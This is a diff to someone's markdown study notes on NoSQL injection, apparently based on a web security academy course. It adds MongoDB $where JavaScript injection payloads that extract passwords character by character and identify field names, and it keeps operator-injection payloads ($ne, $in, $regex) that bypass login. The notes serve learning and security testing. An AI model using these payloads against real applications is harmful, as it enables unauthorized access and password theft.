@@ -62,6 +62,64 @@ Gifts' && 1 && 'x
 
 4. Submit a boolean condition that always evaluates to true in the category parameter. For example:
 `Gifts'||1||'`
+
+## Exploiting syntax injection to extract data
+
+In many NoSQL databases, some query operators or functions can run limited JavaScript code, such as MongoDB's `$where` operator and `mapReduce()` function.
+### Exfiltrating data in MongoDB
+
+Consider a vulnerable application that allows users to look up other registered usernames and displays their role. This triggers a request to the URL:
+```http
+https://insecure-website.com/user/lookup?username=admin
+```
+
+This results in the following NoSQL query of the users collection:
+```sql
+{"$where":"this.username == 'admin'"}
+```
+
+As the query uses the `$where` operator, you can attempt to inject JavaScript functions into this query so that it returns sensitive data. For example, you could send the following payload:
+```sql
+admin' && this.password[0] == 'a' || 'a'=='b
+```
+
+This returns the first character of the user's password string, enabling you to extract the password character by character.
+
+You could also use the JavaScript `match()` function to extract information. For example, the following payload enables you to identify whether the password contains digits:
+```sql
+admin' && this.password.match(/\d/) || 'a'=='b 
+```
+
+### Identifying field names
+
+Because MongoDB handles semi-structured data that doesn't require a fixed schema, you may need to identify valid fields in the collection before you can extract data using JavaScript injection.
+
+For example, to identify whether the MongoDB database contains a password field, you could submit the following payload:
+```
+https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'
+```
+
+Send the payload again for an existing field and for a field that doesn't exist. In this example, you know that the username field exists, so you could send the following payloads:
+```sql
+admin' && this.username!=' 
+admin' && this.foo!='
+```
+
+If the password field exists, you'd expect the response to be identical to the response for the existing field (username), but different to the response for the field that doesn't exist (foo).
+
+You can alternatively use NoSQL operator injection to extract field names character by character. This enables you to identify field names without having to guess or perform a dictionary attack.
+
+### *Lab*
+
+
+
+
+
+
+
+
+
+
 ## NoSQL operator injection
 
 in JSON messages, you can insert query operators as nested objects. For example, `{"username":"wiener"}` becomes `{"username":{"$ne":"invalid"}}`
@@ -77,21 +135,21 @@ For URL-based inputs, you can insert query operators via URL parameters. For exa
 ### Detecting operator injection in MongoDB
 
 Test each input with a range of operators. For example, to test whether the username input processes the query operator, you could try the following injection:
-```
+```json
 {"username":{"$ne":"invalid"},"password":{"peter"}}
 ```
 
 If the `$ne` operator is applied, this queries all users where the username is not equal to invalid.
 
 If both the username and password inputs process the operator, it may be possible to bypass authentication using the following payload:
-```
+```json
 {"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
 ```
 
 This query returns all login credentials where both the username and password are not equal to invalid. As a result, you're logged into the application as the first user in the collection.
 
 To target an account, you can construct a payload that includes a known username, or a username that you've guessed. For example:
-```
+```json
 {"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
 ```
 #### *Lab*
@@ -102,7 +160,7 @@ trying wiener as username which we know is a valid username and password as `"$n
 - if we put administrator as username we get 200 that means user with that name does not exist
 
 if you don't find the username by guessing then use [[regex]]
-```
+```json
 "username":{
 	"$regex" : "^a"
 }
